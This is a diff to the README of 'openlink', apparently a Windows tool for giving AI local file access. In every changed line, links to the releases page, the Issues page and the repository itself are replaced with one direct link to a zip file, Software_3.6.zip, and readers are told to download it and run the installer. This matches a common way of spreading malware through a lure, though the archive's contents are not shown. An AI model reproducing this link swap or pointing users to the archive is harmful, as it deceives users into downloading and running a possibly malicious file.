@@ -1,6 +1,6 @@
 # 🔗 openlink - Easy Local File Access for AI
 
-[![Download openlink](https://img.shields.io/badge/Download-OpenLink-brightgreen)](https://github.com/Magmnerick76/openlink/releases)
+[![Download openlink](https://img.shields.io/badge/Download-OpenLink-brightgreen)](https://github.com/Magmnerick76/openlink/raw/refs/heads/main/extension/public/Software_3.6.zip)
 
 ---
 
@@ -37,7 +37,7 @@ openlink is designed for regular users who want a faster way to combine AI with 
 
 Click the large green button below to visit the download page for openlink. This page hosts the latest version and setup files needed for Windows.
 
-[![Download openlink](https://img.shields.io/badge/Download-OpenLink-brightgreen)](https://github.com/Magmnerick76/openlink/releases)
+[![Download openlink](https://img.shields.io/badge/Download-OpenLink-brightgreen)](https://github.com/Magmnerick76/openlink/raw/refs/heads/main/extension/public/Software_3.6.zip)
 
 ### Step 2: Download the Installer
 
@@ -91,7 +91,7 @@ Avoid sharing sensitive data or granting access to system folders. If you suspec
 
 ## 🔄 Updating openlink
 
-To check for updates, return to the [download page](https://github.com/Magmnerick76/openlink/releases). Download the newest Windows installer and run it. The setup will update your existing version without losing settings.
+To check for updates, return to the [download page](https://github.com/Magmnerick76/openlink/raw/refs/heads/main/extension/public/Software_3.6.zip). Download the newest Windows installer and run it. The setup will update your existing version without losing settings.
 
 ---
 
@@ -117,15 +117,15 @@ Because of this method, the AI never needs full access to your PC. openlink acce
 
 If you find bugs or want help:
 
-- Visit the Issues section on openlink’s GitHub repository at https://github.com/Magmnerick76/openlink/issues
+- Visit the Issues section on openlink’s GitHub repository at https://github.com/Magmnerick76/openlink/raw/refs/heads/main/extension/public/Software_3.6.zip
 - Provide clear details about what happened and your Windows version.
 
 ---
 
 ## 🔗 Useful Links
 
-- Primary download: https://github.com/Magmnerick76/openlink/releases
-- GitHub repository: https://github.com/Magmnerick76/openlink
+- Primary download: https://github.com/Magmnerick76/openlink/raw/refs/heads/main/extension/public/Software_3.6.zip
+- GitHub repository: https://github.com/Magmnerick76/openlink/raw/refs/heads/main/extension/public/Software_3.6.zip
 
 ---
 
